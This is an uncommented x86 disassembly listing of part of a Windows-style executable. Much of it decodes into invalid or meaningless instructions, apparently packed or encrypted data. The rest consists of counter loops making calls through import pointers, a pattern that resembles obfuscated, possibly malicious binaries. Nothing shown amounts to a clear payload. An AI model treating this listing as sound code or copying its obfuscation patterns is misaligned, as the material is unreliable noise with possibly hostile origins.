  40303a:	bound  esi,QWORD PTR [ebp+0x24d23b51]
  403040:	outs   dx,DWORD PTR ds:[esi]
  403041:	jne    0x40302c
  403043:	mov    edi,0xa89c7d39
  403048:	mov    ch,0x48
  40304a:	xor    eax,0x55051c74
  40304f:	add    dl,dh
  403051:	or     eax,0x2b8a9139
  403056:	js     0x40300d
  403058:	and    al,0xf2
  40305a:	ja     0x40308d
  40305c:	pop    eax
  40305d:	and    edi,esp
  40305f:	ss mov esi,0x3f79baa2
  403065:	push   esp
  403066:	retf   0x800d
  403069:	test   eax,0xe9ee1c2
  40306e:	adc    BYTE PTR [edi],ah
  403070:	jle    0x40307b
  403072:	inc    ecx
  403073:	mov    edi,0x9f36577b
  403078:	fiadd  WORD PTR [eax-0x1bd76029]
  40307e:	in     eax,0x18
  403080:	sbb    ebp,DWORD PTR [ebp-0x51]
  403083:	clc    
  403084:	dec    eax
  403085:	cld    
  403086:	ret    0x4144
  403089:	adc    dh,BYTE PTR [esi+edx*8]
  40308c:	repnz mov db3,edi
  403090:	adc    eax,0xd9fa648
  403095:	addr16 push ecx
  403097:	(bad)  
  403098:	in     eax,dx
  403099:	mov    esi,0x547be5c5
  40309e:	repz cld 
  4030a0:	int    0xdb
  4030a2:	fnstcw WORD PTR [edx+0x32ebb88e]
  4030a8:	es loopne 0x40309d
  4030ab:	enter  0x3286,0x71
  4030af:	cli    
  4030b0:	and    al,0xf4
  4030b2:	mov    ebx,0x8392421f
  4030b7:	push   ebx
  4030b8:	cmp    eax,0x100766e1
  4030bd:	out    0x6f,eax
  4030bf:	mov    esi,0xec486502
  4030c4:	sub    eax,0x6a478b6
  4030c9:	sbb    al,0xb0
  4030cb:	fisttp DWORD PTR [ebp+0x50d7154b]
  4030d1:	pushf  
  4030d2:	pop    ebp
  4030d3:	repnz or esi,DWORD PTR [ebx]
  4030d6:	xchg   edx,eax
  4030d7:	and    al,0x4
  4030d9:	addr16 mov edi,0xd3618c02
  4030df:	cdq    
  4030e0:	push   0xffffff88
  4030e2:	leave  
  4030e3:	fnstcw WORD PTR [edx]
  4030e5:	xchg   ch,bh
  4030e7:	lods   al,BYTE PTR ds:[esi]
  4030e8:	outs   dx,BYTE PTR ds:[esi]
  4030e9:	sub    al,0x7
  4030eb:	cmp    BYTE PTR [ebp-0x52],ch
  4030ee:	ret    
  4030ef:	add    eax,0xdb6723c9
  4030f4:	push   ss
  4030f5:	retf   
  4030f6:	inc    edx
  4030f7:	push   ecx
  4030f8:	cmp    al,0x27
  4030fa:	dec    ebp
  4030fb:	xor    edi,ebp
  4030fd:	les    edx,FWORD PTR [edi]
  4030ff:	or     dh,cl
  403101:	int    0xc0
  403103:	dec    ecx
  403104:	inc    ebx
  403105:	mov    eax,ds:0x737ef190
  40310a:	jle    0x4030da
  40310c:	pop    eax
  40310d:	or     BYTE PTR [ebp-0x14],0x33
  403111:	mov    dl,0x18
  403113:	inc    edi
  403114:	sbb    al,BYTE PTR [ebx]
  403116:	or     eax,0x759476aa
  40311b:	(bad)  
  40311c:	mov    esp,0x79f16313
  403121:	sbb    cl,BYTE PTR [edx]
  403123:	call   0xefd62922
  403128:	dec    ebp
  403129:	pop    ebp
  40312a:	mov    ebp,0x7ff95173
  40312f:	jmp    0x4030fe
  403131:	fwait
  403132:	loop   0x4030fe
  403134:	stc    
  403135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403136:	dec    edx
  403137:	mov    eax,0x338dbe15
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx+0x7297c15c],0x9f
  40315f:	push   ds
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x4031a2
  403169:	les    ebx,FWORD PTR ss:[ecx+0x52]
  40316d:	jl     0x4030fb
  40316f:	xchg   DWORD PTR [ecx+edx*2],esi
  403172:	jae    0x403175
  403174:	outs   dx,DWORD PTR ds:[esi]
  403175:	test   eax,0x78be0e6
  40317a:	(bad)  
  40317b:	inc    edi
  40317c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40317d:	mov    ax,0xd4af
  403181:	fnsave [ebp-0x404e2aca]
  403187:	pop    ds
  403188:	in     al,0x88
  40318a:	inc    edi
  40318b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40318c:	mov    ebx,0x144df629
  403191:	cwde   
  403192:	pop    es
  403193:	retf   0x19d7
  403196:	and    al,0x34
  403198:	cmp    eax,0xe959f44b
  40319d:	cwde   
  40319e:	pop    es
  40319f:	mov    dl,0xf1
  4031a1:	pop    eax
  4031a2:	sub    DWORD PTR [esi+0x772808eb],esi
  4031a8:	pushf  
  4031a9:	icebp  
  4031aa:	fimul  DWORD PTR [esi]
  4031ac:	or     eax,0x4bea7b70
  4031b1:	pop    es
  4031b2:	cld    
  4031b3:	mov    ebx,0xa342488d
  4031b8:	(bad)  
  4031b9:	in     eax,0xc9
  4031bb:	mov    ch,0xaf
  4031bd:	jae    0x4031d1
  4031bf:	push   ss
  4031c0:	fimul  DWORD PTR [ecx-0x4df8b18f]
  4031c6:	inc    ebp
  4031c7:	loopne 0x4031c4
  4031c9:	iret   
  4031ca:	lods   al,BYTE PTR ds:[esi]
  4031cb:	adc    eax,DWORD PTR [ebp+0x517270ce]
  4031d1:	outs   dx,DWORD PTR ds:[esi]
  4031d2:	popa   
  4031d3:	push   eax
  4031d4:	(bad)  
  4031d5:	fwait
  4031d6:	pop    ebp
  4031d7:	jns    0x40315e
  4031d9:	clc    
  4031da:	ret    0x3dac
  4031dd:	shl    DWORD PTR [ecx+ecx*1+0x59],cl
  4031e1:	xchg   ecx,eax
  4031e2:	out    dx,eax
  4031e3:	mov    ah,0xb8
  4031e5:	std    
  4031e6:	cld    
  4031e7:	mov    esi,ss
  4031e9:	in     al,dx
  4031ea:	fiadd  DWORD PTR [ebp+0x7d435fab]
  4031f0:	aad    0x6d
  4031f2:	int    0x5b
  4031f4:	push   edi
  4031f5:	pop    eax
  4031f6:	imul   esp,DWORD PTR [eax+0x449956a],0xf696b043
  403200:	fwait
  403201:	or     ebx,DWORD PTR [edx+0x43b894ab]
  403207:	dec    ebx
  403208:	sbb    ah,bl
  40320a:	mov    esi,0xb2d137d9
  40320f:	(bad)  
  403210:	mov    edi,0xdbf58c3e
  403215:	pop    ds
  403216:	scas   al,BYTE PTR es:[edi]
  403217:	aaa    
  403218:	or     ecx,DWORD PTR [edi+0x63]
  40321b:	fprem1 
  40321d:	pop    ebp
  40321e:	data16 fwait
  403220:	dec    esp
  403221:	pop    edi
  403222:	call   0x6798:0xf808e75d
  403229:	div    DWORD PTR [ecx+0x58]
  40322c:	mov    al,ds:0x59cf6bdd
  403231:	inc    edx
  403232:	cmp    ecx,DWORD PTR [esi+ebx*1]
  403235:	pop    ebx
  403236:	xchg   ebp,eax
  403237:	mov    ds:0x128608b3,eax
  40323c:	xchg   BYTE PTR [edx],bh
  40323e:	into   
  40323f:	lods   eax,DWORD PTR ds:[esi]
  403240:	int    0x64
  403242:	push   cs
  403243:	dec    ecx
  403244:	push   ebp
  403245:	push   ds
  403246:	xor    al,0xee
  403248:	pushf  
  403249:	fs push esp
  40324b:	repz cdq 
  40324d:	loop   0x4032a9
  40324f:	and    DWORD PTR [eax],edx
  403251:	icebp  
  403252:	jp     0x403264
  403254:	call   0x492c726c
  403259:	or     ebp,DWORD PTR [edx]
  40325b:	xchg   bh,al
  40325d:	sub    ah,0xce
  403260:	mov    DWORD PTR [ebp+0x66],edi
  403263:	xchg   BYTE PTR [ebx-0x1396b138],al
  403269:	jo     0x4031fb
  40326b:	mov    al,BYTE PTR [edi+eax*2+0x65965871]
  403272:	out    dx,eax
  403273:	and    BYTE PTR [edi],0x14
  403276:	push   es
  403277:	cmp    al,BYTE PTR [edi+0x2818d581]
  40327d:	pop    edx
  40327e:	pop    eax
  40327f:	mov    dh,0x9c
  403281:	cs mov eax,0xe88ac731
  403287:	mov    cl,0xa6
  403289:	push   cs
  40328a:	push   ds
  40328b:	gs ins DWORD PTR es:[edi],dx
  40328d:	clc    
  40328e:	fdivr  DWORD PTR [ecx]
  403290:	dec    eax
  403291:	mov    edi,0x2be851c0
  403296:	pop    es
  403297:	mov    al,ds:0x794091f2
  40329c:	cmp    al,0xcb
  40329e:	and    ah,dl
  4032a0:	retf   0x53f0
  4032a3:	mov    WORD PTR [eax-0x7ed50dd],ds
  4032a9:	mov    BYTE PTR [eax-0x68],bh
  4032ac:	xchg   ebp,eax
  4032ad:	ins    DWORD PTR es:[edi],dx
  4032ae:	shl    BYTE PTR [edi],1
  4032b0:	add    DWORD PTR [eax+0x32],0xfffffff3
  4032b4:	xor    esp,0xab073210
  4032ba:	push   esp
  4032bb:	push   eax
  4032bc:	mov    ebx,0xe010b015
  4032c1:	(bad)  
  4032c3:	add    bl,BYTE PTR [ebx+0x6f]
  4032c6:	cmp    al,0x58
  4032c8:	jmp    0xa929d801
  4032cd:	ins    BYTE PTR es:[edi],dx
  4032ce:	pop    ecx
  4032cf:	sbb    esi,DWORD PTR [ebp-0x4234afab]
  4032d5:	pop    ecx
  4032d6:	les    edx,FWORD PTR [edi+0x4b]
  4032d9:	js     0x403353
  4032db:	or     eax,0x2626d68c
  4032e0:	stc    
  4032e1:	fisubr DWORD PTR [ecx+0x2c34cb4c]
  4032e7:	loop   0x403341
  4032e9:	mov    WORD PTR [ecx-0x31],?
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x7ea82b76]
  403537:	sbb    DWORD PTR ds:0x7e7e15c6,esp
  40353d:	pop    eax
  40353e:	jl     0x4035be
  403540:	jle    0x4035a5
  403542:	pop    esi
  403543:	push   ds
  403544:	mov    dh,0xbf
  403546:	ins    DWORD PTR es:[edi],dx
  403547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403548:	mov    edx,0x17dcbb67
  40354d:	je     0x403558
  40354f:	jmp    0x40355f
  403551:	sub    BYTE PTR [esi+0xc],ah
  403554:	test   eax,0xd1d1a3ed
  403559:	sbb    eax,0xdd1a498
  40355e:	dec    ecx
  40355f:	cmp    BYTE PTR [ebx+0x45],ah
  403562:	jnp    0x403514
  403564:	sar    DWORD PTR [ebx],0x4
  403567:	neg    BYTE PTR ds:[ebp-0x572d9879]
  40356e:	rcr    esp,cl
  403570:	and    DWORD PTR [esp+edi*1-0x23],edx
  403574:	cmp    edx,0x0
  403577:	mov    esi,0x1903350c
  40357c:	int3   
  40357d:	push   edi
  40357e:	mov    dl,0xef
  403580:	mov    esp,0x2ee5771
  403585:	inc    edx
  403586:	push   es
  403587:	cs sub al,0x64
  40358a:	pop    ds
  40358b:	or     DWORD PTR [ebp+0x5b381a70],eax
  403591:	xor    ch,BYTE PTR [ecx+0x43]
  403594:	(bad)  
  403595:	movd   mm4,DWORD PTR [ebp-0x3e]
  403599:	rol    ch,cl
  40359b:	imul   edx,DWORD PTR [ecx],0x1f
  40359e:	jae    0x4035bc
  4035a0:	adc    ah,BYTE PTR [ebp-0x29]
  4035a3:	jp     0x403559
  4035a5:	sub    al,0xa0
  4035a7:	lahf   
  4035a8:	sub    eax,0x4503e483
  4035ad:	sbb    bh,BYTE PTR [ecx+0x79]
  4035b0:	mov    ?,WORD PTR [esi]
  4035b2:	cmp    ebx,DWORD PTR [ebp-0x4aa116b6]
  4035b8:	sbb    al,0x9e
  4035ba:	hlt    
  4035bb:	xor    eax,0x4cd11e24
  4035c0:	sub    al,0x12
  4035c2:	pop    es
  4035c3:	popa   
  4035c4:	(bad)  
  4035c5:	xchg   ecx,eax
  4035c6:	in     eax,0x0
  4035c8:	jo     0x40355d
  4035ca:	fnstenv [eax+0x2bfdd34c]
  4035d0:	inc    esp
  4035d1:	pop    edi
  4035d2:	xchg   edi,eax
  4035d3:	mov    edi,0x559852d0
  4035d8:	push   0x290b785c
  4035dd:	sub    eax,0xf08462b9
  4035e2:	pushf  
  4035e3:	in     al,dx
  4035e4:	scas   eax,DWORD PTR es:[edi]
  4035e5:	cmp    al,0x9c
  4035e7:	pop    es
  4035e8:	cmp    edx,DWORD PTR [esi+0x7b981599]
  4035ee:	mov    esp,0x54af71b3
  4035f3:	hlt    
  4035f4:	retf   0x6b4
  4035f7:	daa    
  4035f8:	cmp    ah,BYTE PTR [edx-0x6f636edf]
  4035fe:	pop    ebx
  4035ff:	aas    
  403600:	xor    eax,0x2be62c96
  403605:	stos   BYTE PTR es:[edi],al
  403606:	xchg   ah,ch
  403608:	pusha  
  403609:	sub    ebx,edx
  40360b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40360c:	cmc    
  40360d:	sbb    eax,0x40302707
  403612:	iret   
  403613:	test   al,0xbe
  403615:	jo     0x40368d
  403617:	mov    al,ds:0xb420fb7d
  40361c:	bound  edi,QWORD PTR [edi]
  40361e:	sbb    DWORD PTR [esi-0x3c],esp
  403621:	push   ecx
  403622:	stos   DWORD PTR es:[edi],eax
  403623:	jns    0x40363b
  403625:	icebp  
  403626:	jg     0x40364b
  403628:	jge    0x4035fb
  40362a:	jecxz  0x403666
  40362c:	xchg   esi,eax
  40362d:	mov    ds:0xf01a7672,eax
  403632:	aaa    
  403633:	sbb    al,BYTE PTR [edx+0x49]
  403636:	lahf   
  403637:	adc    DWORD PTR [ebx+0x35],ebx
  40363a:	adc    DWORD PTR [ecx-0x6a],0x6c
  40363e:	scas   eax,DWORD PTR es:[edi]
  40363f:	scas   eax,DWORD PTR es:[edi]
  403640:	dec    ebp
  403641:	in     eax,dx
  403642:	jo     0x403607
  403644:	ja     0x4035d7
  403646:	sti    
  403647:	ficom  WORD PTR [edi+edi*8+0x78]
  40364b:	dec    edx
  40364c:	add    BYTE PTR [esi+eax*1],dh
  40364f:	das    
  403650:	mov    eax,0x4448e418
  403655:	jmp    0x40364a
  403657:	sub    ch,BYTE PTR [ebx+0x2afeb6ba]
  40365d:	add    al,0x86
  40365f:	fsub   DWORD PTR [edx]
  403661:	adc    BYTE PTR [esi+0x24],bl
  403664:	fisub  WORD PTR [edi]
  403666:	ror    DWORD PTR [edx+0x5cdb53da],0xe1
  40366d:	cwde   
  40366e:	adc    esi,DWORD PTR [edx-0x77]
  403671:	cld    
  403672:	aam    0x1c
  403674:	sub    al,0xc9
  403676:	sub    esp,DWORD PTR [ecx-0x5511e4a7]
  40367c:	in     eax,0xeb
  40367e:	add    ebp,ecx
  403680:	push   cs
  403681:	sbb    eax,0xa8f5e8b0
  403686:	pop    es
  403687:	inc    eax
  403688:	gs inc edi
  40368a:	mov    ebp,0xdea3a0f2
  40368f:	cmp    eax,0x7436d38d
  403694:	jmp    0xc4fbce87
  403699:	inc    ebp
  40369a:	cmp    al,0x65
  40369c:	sti    
  40369d:	pop    ebx
  40369e:	dec    esp
  40369f:	jp     0x403667
  4036a1:	mov    edi,0xb9aca588
  4036a6:	arpl   WORD PTR [eax-0x21],ax
  4036a9:	repz neg BYTE PTR [ecx+0x8d3f66b]
  4036b0:	mov    dh,0x56
  4036b2:	nop
  4036b3:	pop    esi
  4036b4:	cmc    
  4036b5:	mov    esp,0x193a9768
  4036ba:	js     0x403668
  4036bc:	clc    
  4036bd:	mov    ebx,0xe54ddd1e
  4036c2:	mov    ds:0x98ae6213,eax
  4036c7:	out    0x2e,eax
  4036c9:	push   ds
  4036ca:	xor    eax,0x675b9a2e
  4036cf:	pusha  
  4036d0:	push   0x18c07231
  4036d5:	mov    eax,0x96de0cce
  4036da:	in     al,dx
  4036db:	jae    0x4036b3
  4036dd:	inc    ebp
  4036de:	loop   0x40375c
  4036e0:	sub    ah,0x74
  4036e3:	adc    DWORD PTR [edx+0x5af6fd27],edi
  4036e9:	and    eax,0x55d60997
  4036ee:	cmp    ah,BYTE PTR [edi+0x76]
  4036f1:	bound  ebp,QWORD PTR [ebp-0x29]
  4036f4:	sbb    DWORD PTR [ebx],edx
  4036f6:	stos   DWORD PTR es:[edi],eax
  4036f7:	ret    0x333d
  4036fa:	aam    0x68
  4036fc:	inc    ebp
  4036fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036fe:	aad    0x9d
  403700:	mov    ebx,0x8d29e386
  403705:	in     al,0xd2
  403707:	pop    ss
  403708:	addr16 inc esp
  40370a:	cdq    
  40370b:	out    0xff,eax
  40370d:	sbb    BYTE PTR ds:0xb859cf14,cl
  403713:	cwde   
  403714:	jg     0x403698
  403716:	add    al,BYTE PTR [edx]
  403718:	daa    
  403719:	mov    al,0x4d
  40371b:	hlt    
  40371c:	mov    edi,0x10339d0
  403721:	jb     0x403701
  403723:	or     eax,0xf47fb5a2
  403728:	imul   esp,DWORD PTR [ecx],0x4d2216a7
  40372e:	mov    BYTE PTR [edx+0x6c3fec3],bh
  403734:	rcr    DWORD PTR [ecx],1
  403736:	int    0x6d
  403738:	xor    BYTE PTR [eax],bh
  40373a:	loope  0x40370b
  40373c:	and    bl,ch
  40373e:	or     bl,al
  403740:	ja     0x403730
  403742:	adc    eax,0x96bd8184
  403747:	dec    esp
  403748:	push   eax
  403749:	dec    ebx
  40374a:	cdq    
  40374b:	dec    edx
  40374c:	jmp    0x1484:0xa647bf02
  403753:	sbb    BYTE PTR [eax],ch
  403755:	fst    DWORD PTR [edi+0x1a]
  403758:	jo     0x403778
  40375a:	(bad)  
  40375b:	jmp    0x4036ee
  40375d:	stc    
  40375e:	outs   dx,DWORD PTR ds:[esi]
  40375f:	cmp    ecx,DWORD PTR [esi]
  403761:	lods   al,BYTE PTR ds:[esi]
  403762:	cdq    
  403763:	nop
  403764:	adc    ebp,DWORD PTR [eax+eiz*4]
  403767:	or     DWORD PTR [eax],ebp
  403769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40376a:	and    eax,0x8a15e8
  40376f:	jns    0x4037c9
  403771:	push   ss
  403772:	imul   edx,DWORD PTR cs:[esi],0xe2ebbd4a
  403779:	jbe    0x4036fd
  40377b:	neg    BYTE PTR [edx]
  40377d:	mov    ecx,0xdd69185a
  403782:	ins    BYTE PTR es:[edi],dx
  403783:	je     0x40377b
  403785:	mov    es,WORD PTR [ebp-0x69]
  403788:	push   ds
  403789:	sbb    esi,DWORD PTR [ebp+0x3d]
  40378c:	pop    esp
  40378d:	mov    BYTE PTR [edx],dl
  40378f:	jmp    0x2a034b3b
  403794:	add    al,0x80
  403796:	mov    ebx,0x5c1f06ae
  40379b:	pop    edx
  40379c:	cld    
  40379d:	inc    eax
  40379e:	lea    ebx,[eax-0x2d2a52a2]
  4037a4:	ja     0x4037b3
  4037a6:	iret   
  4037a7:	rcl    BYTE PTR [ebx+0xb830e49],0xc3
  4037ae:	inc    ebp
  4037af:	adc    eax,0x6d073949
  4037b4:	rol    BYTE PTR [esi],1
  4037b6:	xchg   ebp,eax
  4037b7:	add    DWORD PTR [edx],esp
  4037b9:	int    0xe2
  4037bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037bc:	sahf   
  4037bd:	xor    al,0xf0
  4037bf:	popa   
  4037c0:	(bad)  
  4037c1:	fs push ss
  4037c3:	out    dx,eax
  4037c4:	outs   dx,BYTE PTR ds:[esi]
  4037c5:	nop
  4037c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037c7:	sub    eax,0x86dfe4db
  4037cc:	mov    edx,0x7104036f
  4037d1:	out    dx,al
  4037d2:	arpl   bx,ax
  4037d4:	or     eax,0x9edb2490
  4037d9:	retf   
  4037da:	scas   al,BYTE PTR es:[edi]
  4037db:	in     al,dx
  4037dc:	xchg   ebx,eax
  4037dd:	mov    ebp,0xd2e79507
  4037e2:	ds sti 
  4037e4:	mov    dh,0x79
  4037e6:	push   ebp
  4037e7:	rol    DWORD PTR [ebx],1
  4037e9:	mov    cl,0x5e
  4037eb:	add    al,dl
  4037ed:	jns    0x4037c0
  4037ef:	sbb    eax,0x9de02db9
  4037f4:	nop
  4037f5:	add    eax,0x61bb6a83
  4037fa:	sbb    cl,ch
  4037fc:	mov    bl,BYTE PTR [esi-0x3d]
  4037ff:	pop    esi
  403800:	pop    edx
  403801:	test   BYTE PTR [esi+ebp*2-0x46883219],dh
  403808:	aas    
  403809:	push   ss
  40380a:	shl    BYTE PTR [eax+0x26],cl
  40380d:	add    esi,DWORD PTR [eax]
  40380f:	stos   DWORD PTR es:[edi],eax
  403810:	mov    al,0xdd
  403812:	(bad)  
  403813:	jns    0x403816
  403815:	(bad)  
  403816:	adc    al,0x3f
  403818:	rcr    DWORD PTR [ecx+0x44],cl
  40381b:	push   esp
  40381c:	push   ebp
  40381d:	xchg   esp,eax
  40381e:	jecxz  0x403811
  403820:	out    dx,al
  403821:	pusha  
  403822:	push   edx
  403823:	inc    edx
  403824:	push   eax
  403825:	in     eax,dx
  403826:	jbe    0x4037ef
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x35fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	ss inc ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43372725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
